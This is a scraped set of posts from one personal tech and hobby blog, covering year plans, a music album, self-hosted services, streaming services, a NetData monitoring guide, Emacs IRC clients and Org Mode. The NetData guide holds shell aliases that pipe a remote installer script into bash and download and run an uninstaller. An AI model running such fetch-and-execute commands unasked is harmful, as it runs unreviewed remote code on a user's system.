books\nCrWikiLibCrystal Library for Handling WikiPedia/Media API calls\nCrFetchLight, system agnostic Crystal Application that shows system information.\nNew ReadsCrystal/Amber based webapp that follows CRUD and MVC and stores books and book info for users\n\nOther\nEntryDescription\nFrugal Living GuideA collection of text that can be shared regarding frugal living.\nMaterial GitMy self-hosted Gitea server\n\nPhilosophy\nI felt this year I was somewhat able to conquer a feeling or a fear that has held me back a lot in regards to enjoying certain things, that fear being completing or finishing something. I believe this fear came from a young age when I would hold on to certain moments in time rather than the whole of an experience due to not wanting something to end. It might sound silly or weird but I really do fear finishing books, movies or even games because I want to only enjoy them for that moment in time and feel as though I can come back at any point. This year I was able to finish more books and games this year than any other year I\'ve been logging those things.\n2021\nPlans\nFor 2021 I plan to continue learning and continue to better myself even though the future may be uncertain.\nMoving Back To Guix\nI had been working with Guix earlier this year and really enjoyed it, but unfortunately due to the limited internet at my place of residence currently I cannot properly maintain or work on the system and instead have relied on Arch as my main distro of choice for work (I use arch btw). If I don\'t go for Guix then perhaps another GNU distro with StumpWM as the window manager and just focus on mainly using emacs for everything.\nCompany Plans\nSo I had some plans for my personal company that are somewhat in the works right now, that of which I\'ll dedicate an entire post for at least, but with that said I plan to change what my company does and redesign the website to match the new focus of the company. I can however tease that I will be setting up services for others to use such as a Git service, a Gemini server, and some other ideas along-side some physical products.\nFinal\nI believe 2021 will be a better year and now with 2020 under my belt I feel more prepared for what is to come in the future.\nTLDR;\n\nRead More Books\nFinished More Things\nPursued Things that spark joy\nLiving more minimal\nDo better next year\n\nResources\n\n2020 Games Completed\n2020 Books Completed\nMy Library\nFull Sitemap\nPortfolio\nBlog\nWiki\nAffiliate Links\nDonations\n\n'] at ['https://materialfuture.net/posts/blog/2020-year-end-retrospective/']

EXCEPT DESCRIPTION FOUND: ['\nIntroduction\nSin is my second album however was the first one that utilized professional equipment and software. The album was heavily inspired by the movie Ju-On - or The Grudge as it\'s known in the states - however the name Sin comes from the N64 game of the same name. The original artwork for the album was the kanji for Sin while the background was a green/black void that I mocked up, this was later changed to the album art you see now of an angel carved into stone, that image comes from my time in Greece mid-2012 when I got to explore some monasteries in the hills of Athens where I did a sort of photo-shoot for my music.\nAll of my releases up until this point were comedy releases featuring joke tracks and remixes mostly for Soundcloud and the likes, this release being my first serious release was not only enjoyable to produce but challenging. While I cannot remember what VSTs were used I can remember that it was all recorded using Logic Pro\'s toolset.\nAt this point in my life I was going through quite a bit and creating music helped a lot emotionally, not only that but I was able to meet a lot of interesting people through my music as well.\nTracks\nTrack #Name\n1Enter\n2Preparation\n3Curse Grudge\n4Haunting\n5Thunder\n6Space\n7Growth\n8Start Again\n9Break\n10Travel\n11Wind\n12Reprisal\n\nWhere To Listen\nYou can checkout the album at the links below.\n\nYouTube\nBandcamp - Album\nBandcamp - All Music\n\nOther Links\nHelp support me making more content by checking out the links below for ways to contribute.\n\nAffiliate Links\nDonations\n\n'] at ['https://materialfuture.net/posts/music/sin-album/']

EXCEPT DESCRIPTION FOUND: ['General Site/Services Update\nIn this post I\'ll be going over updates regarding services I run in an effort to be more transparent.\nGitea\nSo for my GitTea service that I host I\'m still having some issues with memory allocation on the server and that may be due to something I\'ve configured but either way I\'ve taken the server down due to instability (as I don\'t want to lose my projects) and moving to sourcehut as I\'m already paying to host Git, this would allow me to collaborate with others and not support M$ by using something like GitHub. My only concern is pushing a lot to the service since I tend to have LaTeX and org docs saved in private repos, but I may email Drew DeVault regarding that rate limit or file limit on paid accounts. Hosting Gitea for that short time did give me insight into hosting services on a low resource machine, that being said in the future when I have more expendable income I may wish to spin up another Gitea instance or perhaps a SourceHut instance, I will look into this. Please Note: The domain git.materialfuture.net is currently down as of writing this but will be routing it whatever git platform I go to.\nIRC Bouncer\nCurrently I run a ZNC IRC Bouncer on my server and plan to create accounts for others so they may use it. This will have it\'s own subdomain on MaterialFuture.net and will be closed for only people I know.\nGemini Server\nI have gone ahead and spun up a simple Gemini site, which will be updated along with this site as time goes on. If multi-site is possible then I\'d be willing to let some people also be hosted there. \nSo far I\'m still troubleshooting issues I\'m having with gmnsrv so the site is not live, however when it gets working I will be making a post regarding that.\nYouTube and Videos\nI will be continuing to upload to YouTube but I will also be uploading some content to a PeerTube instance that I find that meets the niche set of criteria I want for my content. \nThis Site\nThis site will be getting some changes in the coming months, more content, Gemini availability, possibly Gopher, and more so an overhaul of the Wiki Section. The plan is also to also include updates to project sections and more links to things but I need to tackle things one at a time.\nThere will be more categories coming to the blog posts, my goal for this is when I blog to properly tag and categorize posts so there isn\'t an abundance of posts upon viewing the page.\nFediverse\nIf follow me on Fediverse I have to say that I\'m sorry for not updating as I only periodically check mastodon now via the web browser rather than the app that of which I no longer have on my phone. I will be looking into setting up twtxt feed or some other picobloging format, that way it\'s hosted on my site and I won\'t have to download an app t really get it running.\nRSS\nIf you\'re not already please subscribe to my RSS feed as that\'ll be what I update most for the time being. \nThere are multiple categories on this site which can be a bit much, you can customize what you see in your RSS feed by specifying the url you wish to get a feed for.\n'] at ['https://materialfuture.net/posts/blog/services-update/']

EXCEPT DESCRIPTION FOUND: ['Online and Streaming\nSince quite a few people I know tend to only stream their music or listen online I figure this is a good place to start.\nI\'ve used quite a few streaming services to listen to music over the past 10 years, So I\'ll briefly show them with some comparisons;\nNameOnlineOfflineFLAC\nBandcampXXX\nSpotifyX*\nTidalX*X\nDeezerX*X\nYouTubeX*\n\nX = Yes\n* = It does but within a proprietary application\nReason for leaving Spotify\nI\'ve used Spotify for well over 6 years at the time of writing this, and honestly I cannot support a company such as Spotify any longer due to their actions against artists and consumers.\n\nIt Sounds Like Spotify Is In Trouble\nSpotify patents technology to recommend songs based on the speech, emotion of users\n\'246 companies\' get your Spotify data\nSpotify may soon monitor your age, gender, and even emotional state\nSpotify to offer artists and labels the option to promote their music in your recommendations\n\nSpotify Alternatives\nWhile I\'ve been a longtime BandCamp supporter they\'re not a streaming client for all artist, it\'s primarily for independent artists, which is awesome but not a good replacement, that being said it had lossless options for you to download when you purchase an album. \nYouTube is great for finding great music to listen to and download but there\'s a limit as to what you\'ll find as well as the lack of Hi-Fi audio.\nTidal I thought would satisfy my want for Hi-Fi and for catalogue they offer but overall the service lacks support for open-source tools making it something I don\'t want to support, that and the rising cost of the Hi-Fi/Master service make it undesirable in the long run.\nDeezer - a service most people probably haven\'t heard of - offer almost everything that I\'ve said above with some caveats. It\'s online streaming is great with a large number of platforms under it\'s belt and a variety of applications that support Deezer streaming. It\'s Hi-Fi price point is what the price of Tidal used to be making it the cheapest for Hi-Fi. Good price, lossless audio format, github tools for listening offline, and a catalogue just as big as the other services make it something that I\'ll most likely move to.\nDRM?\nYou may be asking why I\'m choosing to stream content that I don\'t own rather than just getting the digital version, and the answer is mainly due to there being no difference. If I can download the music I want off of Deezer to listen to offline even when I no longer pay for it then I don\'t really see how that\'s any different from me going to the library or to a friend to borrow a CD and rip it onto my computer. I still buy digital albums, CDs, Cassettes, etc from artists that I like so I don\'t feel like I\'m taking revenue from them when they still get money from listens as well.\nOffline Listening\nI have a pretty large collection of CDs and cassettes from over the years of going to shows and music festivals, but with that large collection comes the trouble of storing those songs and labeling them.\nTools\nNameUse\ncmusTerminal-based music player\nabcdeTerminal program to rip CDs\nClementineMusic Library/Tag Manager\n\nThe above are the tools I primarily use for offline listening on my laptop, anything else will be with actual equipment I have (turntable, cassette deck, etc.).\nThe Future\nI hope to setup a media server sometime by next year with Kodi or Jellyfin running on a server with all my music tagged with proper cover art and such. Whenever I do that though I hope to write an article regarding that.\nFinal Notes\nWhile I mainly listen to music offline I like checking out new music every so often and being able to follow artists I like without using social media. Offline is obviously superior in many ways, but having options is important. While I avoid using proprietary services on my personal machines I do let up a bit when it\'s music related.\nIf I\'m wrong about something or you think there\'s a better alternative then feel free to reach out to me by visiting my contact page.\nOther Links\nHelp support me making more content by checking out the links below for ways to contribute.\n\nAffiliate Links\nDonations\n\n'] at ['https://materialfuture.net/posts/music/streaming-services/']

EXCEPT DESCRIPTION FOUND: ['Intro\nSo as of late I\'ve been looking into ways to update my knowledge on general networking, could architecture, Docker/Kubernetes. KVM Virtualization, and linux systems in the cloud and in this search have been finding some really easy ways to manage systems. With that I hope to make some posts regarding what I\'ve learned so other people can easily understand and possibly get started with these technologies, the first of which being Network Monitoring. \nRegarding Network Monitoring Tools\nThere are a good amount of tools in the realm of networking for logging and monitoring system usage and network usage, however this post will be referring to the  NetData tool as I\'ve found it fairly easy for beginners to get up and running and because I can\'t seem to find much on it online.\nRegarding NetData\nI will not be going over NetData as a whole rather I\'ll be giving a quick guide to get up and running on your system and a simple config to add to your .profile file.\nFor more in-depth documentation visit the official docs for NetData\nStarting\nPlease Note: This post assumes you have knowledge of Linux systems or at the very least Docker.\nThere\'s two ways of setting up NetData, either as a dashboard for your one server or as a dashboard for all your connected servers, which this guide will try and cover both briefly.\nIndividual NetData Dashboards\nIf you\'re just looking to have a monitor for your local network for something like a home server or even for a single raspberry pi then this is perfect.\nSingle Dashboard\nIf you have clients or nodes you want to monitor then this is a good method. The difference is you\'ll need to install netdata on other nodes and link them. \nNo matter which you choose you\'ll still be setting up a dashboard.\nSetting up your dashboard\nRecommendation: Use something like Ansible to make changes and updates to multiple systems.\nBelow is the an alias block I\'d recommend adding to your .profile on your the server your dashboard is going on as well as any node you may be using, that way provisioning, setting up, and taking down of nodes becomes easier.\nSave this locally for now as you\'ll most likely make changes to this as time goes on.\n\nalias netdata-add="sudo netdata-claim.sh -token=TOKEN -rooms=ROOM1,ROOM2 -url=URL_TO_YOUR_NETDATA_INSTANCE"\\\n      netdata-remove="sudo netdata-declaim.sh -token=TOKEN -rooms=ROOM1,ROOM2 -url=URL_TO_YOUR_NETDATA_INSTANCE"\\\n      netdata-install="bash <(curl -Ss https://my-netdata.io/kickstart.sh) --stable-channel --disable-telemetry"\\\n      netdata-uninstall="wget https://raw.githubusercontent.com/netdata/netdata/master/packaging/installer/netdata-uninstaller.sh && chmod +x ./netdata-uninstaller.sh && ./netdata-uninstaller.sh --yes --env /etc/netdata/.environment"\n\nIt\'s recommended that you install netdata via the curl command rather than using a package manage that way you can customize things like --disable-telemetry and --stable-channel.\nAssuming your running systemd check that your service is running by doing: sudo systemctl status netdata. If it\'s running then you\'re good to go.\nFollow the documentation for setting up the dashboard either via NGINX or Apache on your main server.\nAfter that you should have a dashboard hosted, from here now you can start provisioning your nodes.\nAlso, depending on what OS your running, things like environment variables will be different, or rather paths to file will be different.\nProvisioning Nodes\nStart by going to your dashboard setting and getting the API TOKEN, the War Room you wish to assign each node to, and the URL to the dashboard.\nFrom here take that alias block I gave your above and add in those variables such as TOKEN and ROOM.\nNow you can copy over your alias block over to the servers you want to monitor and get them provisioned a lot quicker with new alias commands.\nAlternatively you can create a bash script to do all of the actions or pass the commands through something like Ansible and automate having to go through each server individually to configure them.\nOverall Notes\nI\'d say NetData is fairly simple to install, it get more complex when you start getting into the GUI and customizing the data and war rooms for different things. I can see using this tool with others in the future.\nQuestions\nWhy do this?\nEasy, having a tool to allow you to quickly view network data and usage is invaluable.\nIs This All I Need?\nNot really, you still of course will need to know what to do with that data you have such as optimizing services and applications to not take up resources or see if perhaps you need an upgrade.\nThis already assumes you have knowledge of Linux systems, basic networking knowledge, and will be utilizing networking automation tools.\nIs there an even easier way to do this?\nYeah, you could go the route of Docker and installing things that way, but that can be just as much effort especially if you plan to have a centralized dashboard. You can use Docker, but it\'s not something I\'d recommend unless you understand first how the software works before deploying containers.\nWhat About NetData Cloud?\nYou can use NetData Cloud but you get less control over your Dashboard and have to keep up with changes to their service and policies. It\'s better practice to host things yourself and be responsible for your data or at least be knowledgeable of what is going on in your networks.\nI used NetData Cloud to test out the services and see how it all worked before diving deeper into it, but I\'d still highly recommend just setting up your own instance.\nAre There Any Good Alternatives?\nA great alternative to netdata is Cockpit which Vultr includes in some of their Vultr pre-configured instances. I hope to create a guide for that sometime soon as I\'ve used Cockpit in the past.\nHow Do I Get This Off My Machine???\nFollow the official documentation to uninstall NetData, but I\'ve also included it in that alias block assuming you\'re running Debian and have SystemD.\nResources\n\nNetData\nCockpit\n\nOther Links\nHelp support me making more content by checking out the links below for ways to contribute.\n\nAffiliate Links\nDonations\n\n'] at ['https://materialfuture.net/posts/servers/2020-11-6-learn-netdata/']

EXCEPT DESCRIPTION FOUND: ['\n   \nIf you\'ve been following me for a while you probably know that I\'m a fan of older game systems such as the GameBoy and have been wanting to contribute in some way to the communities that surround the system so they can continue to create new games for it and keep interest as the years go by.\nRight now I\'m working on this asset pack for GameBoy which as of writing this contains a basic sprite sheet and a basic player model I\'ve created. These assets are based on the ones created by Pixel Pete but with much more added to them like variations in flora, rocks, and general floor patterns. The aim of this was for people interested in creating GameBoy games to easily be able to put something together without having to worry to much about creating their own sprites. I\'ve made the sprites and sprite sheets to be used with Tiled and GB Studio, which is why the sheets might seem a bit cramped being that most of assets are modular meaning you can mix and match parts of the terrain, buildings, flora.\nI had created this initially for a game I\'m working on for GameBoy that has yet to be named or anything, and while I have put many hours into making this a nice starter sprite sheet and asset pack, I\'m offering it for free on itch.io so anyone can use it. As an added bonus I\'ll be updating the pack every so often with new assets and updating existing ones so that way there\'s a reason to come back.\nIf you like what I\'m making, consider helping me out a bit by donating as it would help incentivize me to make more asset packs and work on more projects.

EXCEPT DESCRIPTION FOUND: ['Intro\nSo you\'re probably wondering what RSS is and you\'ve probably heard about it or perhaps clicked a link and see some cryptic text file of some sort in your browser. In this post I\'ll go over what RSS is, how to use RSS, and what makes it Superior to other options.\nWhat Is RSS?\nRSS or Really Simple Syndication is a format much like HTML that a program can easily read and display information regarding blog posts from a site, news source, or podcast and is that standard for a lot of feed reader type applications. You\'re probably already using RSS and you probably don\'t realize it as almost every podcast out there uses RSS to syndicate content across applications like Apple Podcasts or any old podcasting app out there, and same could go for many news apps on your phone as well. This mean, unlike HTML, you see all of what that site or feed shows you, there\'s no directories everything is instead under one file typically something like www.somesite.org/rss.xml or www.somesite.org/feed.rss.I\'ll go into detail later on why this is all is important and why I think is somewhat superior to typical HTML.\nHow Do I Read This?\nRSS uses the formats XML, RSS, and Atom to display the information that the host provides, but yeah how do you go about reading that?\nGUI-Based\nFeedly\nOutside of tech enthusiasts users of RSS typically will go with an app on their phone or on the web and the go to one for that being feedly. I\'d consider feedly the most beginner friendly example of what an RSS reader can do.\nText-Based\nEmacs\nEmacs can be used as a simple RSS client and is personally my prefered way to read RSS as I can easily view it without having to leave Emacs, read more on why I like Emacs so much and what makes it so great. The best feed reader in my opinion is elfeed which is easy to configure, here\'s an example of how to setup your feeds in elfeed.\nAnother way within emacs to setup RSS feeds is via gnus, but that would require a whole article explaining how to go about that so I\'ll just link this video from prot to explain gnus.\nNewsboat\nAnother way to read RSS feeds is via a simple terminal program called Newboat which a lot of Arch and non-emacs people prefer due to how lightweight and fast it is. This is preferred way to read RSS on my machines not running Emacs.\nOther\nIf you\'re in doubt, search engines are your friend when looking for a feed reader that suits you. I recommend giving a few readers a shot to see what you prefer the most.\nWhere do I find RSS Feeds?\nWith a simple search you can find feeds for most of your favorite sites, for example search "world news RSS" or for specific sites like "IGN rss feed" for links to your favorite site\'s RSS feed. I also compile a list of RSS feeds I find to share with people which you can find in this git repository.\nDid you know you can subscribe to and read whole subreddits on Reddit offline? Just add .rss at the end of the subreddit url and it\'ll direct you to the RSS feed (ex. https://old.reddit.com/r/worldnews/.rss).\nWhat\'s So Special About RSS?\nYou\'ve made it this far down and you\'re probably just asking why would you choose RSS rather than anything else or why does it matter? So in response I\'ve compiled a bulleted list of my top reasons for using a feed reader;\n\nNo ads\nRead new article offline (download once and use whenever)\nYou get the news when you want and where you want\nCustomization of content and Filtering\nOne app or program for all your news\nYou\'re in control of what you consume\n\nThese are the main reason why I switched over from the ad-filled websites to the clean and customizable experience of a feed reader.\nResources\n\nWhat Is RSS?\nMy compiled list of RSS feeds\nFeedly for Web\nNewsboat Terminal Program\nElfeed for Emacs\nManage podcasts in Emacs with Elfeed and Bongo from Prot\n\nLiked what you read?

I want this post to serve as an intro for what is to come in this category and explain maybe my reasoning before diving into things.\nMy main reason behinds this category is to document my thoughts and opinions on games I\'ve completed, dropped, or upcoming releases. Not unlike others I play games as a hobby and try my best to get something out of them, much like when you read a book you shouldn\'t read it to read it but read it to gain something from it or maybe get a new perspective on things.

I also want to update people on some projects that I have working right now and changes to the site.\nImages and Pictures\nI\'ve been trying to avoid putting photos or images on this site for the sake of minimalism and for the sake of bandwidth for users without great internet, but after some thought I decided on setting up a file hosting service for smaller assets on this site and include links to my photography as well as any visual work I\'ve done.\nThis service may be later moved to a cheaper higher bandwidth host if I start seeing it being used a lot.\nGames Blog Category\nNothing really new here just a new addition to the blog talking about video game related topics and discussions. I want to focus on covering the games I\'ve completed, played, and what (if anything) I\'ve taken away from the experience.\nI may choose in the future to create; music, gardening, cycling, and computer hardware categories but that may prove to be time consuming managing all those so that\'ll have to wait.\nThe Now Page\nI\'ve gone ahead recently and added a now page, that of which I try and update about every other week with info regarding what I\'m learning, doing, reading, and what comes next. I want this to really be the highlight of my site, so people can see and understand what I\'m striving for.\nWiki\nI will be taking some time soon to update and trip the fat on my wiki pages. I\'ve already started by adding sections to the main wiki page this is something that needed to be done so at a glance people (or myself) can find what they\'re looking for. I hope sometime soon to go back and just trim down all the pages to just have the most important info, the ones I\'m looking to focus on are ones for my software projects where I should focus on making them less of just a README and more of a How-To article.\nThe Site\'s Design\nI realize that since I\'ve added svg icons at the footer and some unicode icons throughout that the site is starting to not look as great on Lynx or other plaintext browsers. My goal for the site this year was to make this site lightweight and offline compatible without the need for Javascript for PHP.\nSome other concerns are with ADA and general accessibility on the site, as currently some pages don\'t play nice with screen readers due to some semantic HTML errors in my Zola template.\nArt and Photography\nThis one is a big one for myself, as I used to do a lot of artwork in the past in both digital and physical mediums. That being said I will start a category for my artwork and photos when I can get some good scans of all of them.\nI\'ve also taken a break from doing my sprite work due to my focus primarily being on programming, but starting soon I hope to return to my itch.io page to upload not only free sprite work but some GameBoy related things I\'ve been working on.\nLast Bits\nSo not much to add really other than plans for this site and other things I\'m working on. I\'m hoping to return back to working on art and music more but that is dependant on my financial situation considering most of the things I own are in storage somewhere.\n\n“If you don\'t have a plan, you become part of somebody else\'s plan.” ― Terence McKenna\n'] at ['https://materialfuture.net/posts/blog/updates/']

EXCEPT DESCRIPTION FOUND: ['Intro\nFirst off, this post is aimed at people interested in Emacs and people maybe wanting to learn more on how they can use IRC in their favorite editor. This is also aimed at sharing information on tools for Emacs as I feel like there\'s not a lot of posts really talking about how people set things in up.\nI\'ll try and make this post short as I want to mainly focus on IRC and in later posts go over other tools for emacs.\nWhat\'s out there?\nOccording to the emacs-wiki the IRC programs people typically use are as follows:\n\nERC\nIrChat\nLieceIrcClient\nrcirc\nRieceIrcClient\nZenIRC\nCirce\nii-mode\nWeeChat\nI\'ll be going over the ones I\'ve personally tried starting with what I currently use. I recommend trying out a couple as they all have their advantages.\n\nCirce\nCirce not only is the one that requires the least amount of configuration but is lightweight.\nMy example config for Circe:\n\n(setq circe-network-options\n      '(("Example"                          ; Connect to specific IRC server\n         :host "irc.example.com"            ; Server url or IP to connect to\n         :port 6697                         ; What port, keep in mind TLS or non-TLS connections\n         :tls t                             ; If you want to connect via SSL\n         :nick "your-nick"                  ; Your new or registered Nick\n         :pass "*********"                  ; Your password\n         :channels ("#emacs" "#example")))) ; What channels to autoconnect to on login\n\nThis works well for me since I visit different IRC server and like having multiple buffers open to see. The only thing That hasn\'t worked for me is using it with ZNC so I\'ll need to investigate that further and see why that is.\nERC\nERC much like gnus and other GNU tools for emacs erc very verbose and can be a bit confusing for people just wanting to hop into IRC. Good news if you like gnus though, the configuration should feel very familiar.\nI don\'t really recommend this one unless you really want to invest some time to get things working.\nI have seen posts on /r/emacs showing off ERC working, so feel free to try it and if it works for you email me that I\'m a dumb dumb for not getting it, same goes for gnus. \nWeeChat.el\nWeechat.el (yes, that weechat ) is a mode for emacs that takes the relay input of weechat and makes it accessible in emacs with all the good stuff emacs offers. If you already use Weechat then it\'s a no-brainer to use, all you need to get going is to setup a relay server and hook the credentials into the config file in emacs. This is the same as you using something like Qweechat or WeeCloud. You could setup WeeChat to run basically as a bouncer on a PasberryPi somewhere and just connect to it wherever with whatever client.\nThe downside to doing this is that you\'re having to run weechat and emacs rather than just doing things within emacs, which is fine but I try and have everything the same across all machines and having to use Weechat not on a server could complicate things. Not only that you\'ll most likely experience input latency much like if you were to use emacs remotely as well.\nrcirc\nrcirc is much like ERC in that GNU has added it to Emacs. While I couldn\'t get rcirc working for me it seems others have via reddit, to which I say to search on /r/emacs or GitHub and find people\'s configs to see what works.\nAfterthoughts\nFor now I\'ll be using Circe as it just works with very little fuss, but if in the future I change to something else I\'ll update this post. \nTo you the reader, if you\'re struggling with something or have found something that works for you please share with people as that makes it easier for people to learn more and maybe find a way out if they\'re struggling. Overall, explore your options and have fun doing so.\nI hope to do more of these posts going over Emacs and some other software I use, my next post will most likely go over Guix or RatPoisonWM. Feel free to contact me and let me know if you like the post or if you just think it sucked.\n'] at ['https://materialfuture.net/posts/blog/2020-8-18-emacs-irc/']

EXCEPT DESCRIPTION FOUND: ['Intro\nIn this post I want to cover a bit of what I\'ve been working on and share my thoughts on what I believe are some interesting thing regarding productivity and computers without getting preachy or hand-holdy like some of my other posts can come across as.\nIf you\'ve followed me on Mastodon, IRC, Git services, or other then you\'ve probably seen that I\'ve been a bit quiet, the reason for this being that I\'ve taken the time to yet again reassess what I want and what I want to become as a developer and as a person - which at this point is a pretty common theme this year. I\'ve been distancing myself from Social outlets and online activity to detox and give myself the motivation to learn - more on that later - and start working on projects that I wish to showcase.\nWhat Am I Learning?\nRecently I\'ve been taking a liking to Lisp and lisp dialects mainly Common Lisp and Clojure but have also been dabbling in Guile. With this I\'ve been reading and watching content regarding Programming both in theory and in practice as well as Mathematics, to which I would say are the fundimentals to really "getting" Lisp in the meta sense. Another reason for learning lisp has been to utilize emacs more and start writing code for writing code or I guess writing terrible emacs-lisp code to have macros for editing and compiling and editing the various languages I utilize and notes I take via org.\nThe Machines\nFor my main machine, the offline-focused Librebooted x200, it now runs the Guix operating system and now I\'m forced to think carefully about what I want my machine to have on it and also having the benifit of utilizing emacs as more than just an editor/IDE but as the main way I can talk to and interact with my operating system. Learning Guix has tough at first but was very rewarding having a system that was easy to configure and easy to manage. Hopefully I can take some time to document my time with Guix and Guile to help those wanting to learn more about it.\nMy other machine is a Thinkpad e545 which has replaced my desktop computer and has been a pleasure to use. While this machine partially goes against some of my beliefs it does allow me to comprimise and be able to do the online-focused part of my work such as answering emails and managing servers, things that would be a bit more difficult on the x200.\nCommon Lisp\nBack in early April I started learning Common Lisp through \'Practical Common Lisp\' and \'Land Of Lisp\' to which I was having trouble understanding a lot of the hows and whys. Since then I\'ve decided to reread and review my learnings on lisp and start putting that to use through the means of coding challenges and such. Common Lisp has been a real joy to use and it honestly made me enjoy programming again and glad revisiting it gave me the inspiration to move forward with it as a main language for personal projects as it\'s easy to prototype and get something working fast. Not much else to say about Common Lisp other than I enjoy it a lot.\nClojure\nI\'ve was seeing quite a bit online about Clojure and it\'s company getting purchased by Nubank so I decided to take a stab at learning Clojure and try to see what it\'s all about. So far Clojure is not much different from Common Lisp or Scheme so it was pretty easy to get going, the only snags I found were Java specific Libraries and that\'s only because I\'m not that familiar with them as I\'m more acustomed to Lisp rather than Java. My experience with the JVM is limited to the month or so I worked on some Java software for an HR firm, and while that was actually pretty enjoyable the problems I faced due to lack of knowledge of JVM and how Java code is compiled (via NetBeans or Eclipse). At the time of writing this I can see myself learning more about Clojure but I can only see myself utilizing it if an employer wants me to.\nOrg/TeX\nAs of writing this I\'ve converted almost all of my digital notes and documents over to org documents or over to TeX documents. The combo of Org-Mode/LaTeX is awesome and I reccomend all emacs nerds to try it out for writing papers as it\'s as easy as writing org but with the customization of your output pdf with LaTeX. All the documents I manage such as my invoices, resume, client documentation, and client contracts are handled via org/LaTeX.\nAside from writing docs I\'ve also been working on setting up a good workflow for Org-Roam a tool for managing a directory of org documents more like a database than a directory structure. I\'m utilizing org-roam as a wiki of sorts for finding data quickly that I\'m looking for such as client info or a specific invoice or even pull up info that I\'ve written about a server I manage to make sure that specs are correct, whatever the reason. At the time of writing it\'s being setup but hopefully within the month there can be a an easy way to access data without leaving emacs.\nWhat Am I Doing?\nI\'m focusing on learning and organizing my thoughts as I believe that to be the key to being a better developer and a more disciplined person. I aim to be a well rounded developer that creates software that accels in aiding others rather than inhibit them.\nI guess what I reflected on was what I wanted to learn and what made me happy as those I think are two things that people often neglect in their lives.\nNot much else to say other than take care of yourself by eating right, getting enough sleep, socializing responsibly, and taking some time away from the internet to reflect on things as a person, like can be about your work but have a healthy balance of work and life. Oh and drink more water.\nTLDR\nIf you\'re interested then visit my now page where I update what I\'m up to semi-regularly.\n'] at ['https://materialfuture.net/posts/blog/time-to-step-back/']

EXCEPT DESCRIPTION FOUND: ['What Is It?\nOrg Mode or org-mode is an Emacs mode that allows one to not only write notes but create an entire ecosystem around the text and data you enter into your org documents, more on that later. Mode mode utilizes the power of emacs\' own language elisp to not only run efficient but be extendable, meaning org-mode can be whatever you make it to be as well.\nOrg can potentially replace the use of office suites by being an all-in-one customizable tool personalized to you and your workflow.\nWhat Can It Do?\nText Input\nObviously it can input text, but it does so in a unique way as org documents are just plaintext and all the magic happens in the IDE interpreting that file. If you\'re familiar with Markdown or similar syntax then writing notes in org will feel familiar.\nTodo\nOrg Mode has a power TODO system with an integrated calendar and agenda system that collects and organizes all instances of TODO tags and allows you to see them all in one place, so your org-agenda is the home base for seeing all tasks, notes, reminders, and even code snippets at a top-level view.\nSetting up TODO tags on item is easy, you need to just add * TODO Your todo item\nTables\nPeople seem to love the tables in org because they work like embedded excel documents rather than just markdown tables. You can have multiple tables in a single document, have their data be imported or evaluated from another file, and have them talk to each other to produce another table. \nWhile that might seem overwhelming, the table system is a easy to use as excel when it comes to data input, it\'s when you get to the more advance things that it can feel more complex.\nI use tables to organize things in my life such as finances, books, and general data input. It\'s quick and easy to use and can be export into a multitude of formats.\nExports\nMy personal favorite thing about org is it\'s export system as it allows you to export you documents as HTML, PDF, LaTeX, Powerpoint, etc. Creating a PDF for example is nice because you can define the styles in your Emacs settings much like you would a LaTeX document and then just start writing your org documents, but of course you can use the default styles if you don\'t care about how your exported PDF will look.\nDocumentation For Your Project\nThis is something that I feel can be overlooked when working with org in a work environment, even though org is powerful people often seem skeptical in including into codebases.\nOrg documents can allow a single source of truth for documenting your code, meaning, you wont have to create a wiki for your developers to use, rather it can be a single org-file within the project that has links to lines of code or whole files. Also, by doing this you could in theory also export to HTML or PDF and have a document people can easily view in their browsers users aren\'t using Emacs at your company.\nAfterthoughts\nI don\'t think Org Mode is for everyone, especially if you don\'t like Emacs, but if you are comfortable working in that environment then I encourage you to at least try it.\nOrg Mode has a lot more features than the ones mentioned about, not to mention the amount of extensions you can use with it, so I encourage you to refer to the Org Manual and look on GitHub for more on Org Mode and learn more reasons why it\'s great.\nI use org for pretty much anything that requires writing or that needs to be added to my TODO as no other tool matches it\'s power, and since I do almost everything within Emacs it works out perfectly. If you do happen to start using org-mode I\'d recommend you try it first for taking notes and slowly integrating new things you learn into your workflow and create a workflow that works best for you. \nWhat got me into org-mode was this video featuring Harry Schwart at thoughtbot as it goes over what I feel are the most important aspects of Org-Mode + Emacs.\nResources\n\nOrg Mode Video\nDistroTube Video on Org-Mode + Doom Emacs\nAtomized Talking about Org-Mode\nOrg Manual\nPost regarding my workflow\nEmacs Guide\n\n'] at ['https://materialfuture.net/posts/blog/2020-07-org-mode/']

EXCEPT DESCRIPTION FOUND: ['Intro\nIn this blog post I\'ll be going over some of the tools I use to get things done as well as some workflows and other ways I go about doing things. The purpose of this post is to inspire people to take a look at their other people\'s workflows and tools and consider what are efficient ways of doing things. The sections for this will be split into what I use in my typical Linux environment, what I use in my emacs system, and any other tools outside of the command line environment I\'m usually in. I won\'t be including the tools that I use for graphic design as the focus of this is more day-to-day things and the occasional programming, so more computer oriented on the Linux system.\nLinux System\nIf you\'re reading this you should already know the linux system, if not then it\'s fine as some of the topic I\'ll cover can work for systems such as BSD and other UNIX-like systems.\nEmail\nMy email client of choice is aerc and not only for the fact that it was built as being a tool for email-based git workflows but also that it works in plaintext and works really well with my mail server. I prefer plaintext of course but I also prefer an email client that just works and is easy to setup. In my system I have the keybindings set for aerc as Mod + Shift + E, this way it\'s easy to remember and it\'s near the home-row on the keyboard. I prefer this over gnus for emails because I found that mbsync is quicker to get setup and much less CPU intensive overall.\nNews/RSS\nMy RSS reader of choice has been Newsboat as it\'s insanely fast at checking the 25 links I have set for it to look though, but also how quick it is to read through multiple articles and save them. I have the keybinding for this set to Mod + n, this I feel is natural to access, but it can also be accessed either by the i3 bar. I\'m a fan of vim-keybindings, and of course newsboat supports those as well, always a plus for me.\nMusic\nI\'ve tried a lot of terminal and GUI applications to go through my music library but none come close to cmus as it\'s ability to quickly go through and shuffle songs is seamless. It picks up on music tags, is able to play FLAC (and other formats) with no issues, and of course vim-keybindings.\nFile Manager\nRanger is my go to for managing files on my main computer, but if I\'m on my desktop I will use Dolphin as it\'s excellent when it comes to managing lots of data. I primarily like ranger because it\'s quick to use the arrow keys to go about and open a file in whatever program it belongs to.\nEmacs\nNow onto emacs, my Text-Editor/IDE of choice as it can do much more than just edit some text.\nNotes\nFor all of my digital notes I now primarily use org-mode, which allows for more in-depth writing and organization. \nWithin org documents is; \n\nA spreadsheet editor\nAn eval buffer for passing in functions and data to be presented on export\nA robust export system that allows for exports to PDF, LaTeX, HTML, and anything else pandoc can handle\nA powerful import feature that allows for the importing of other files into your document\n\nTodo\norg-agenda is a very powerful tool that I only recently got acquainted with, and it has help to eliminate 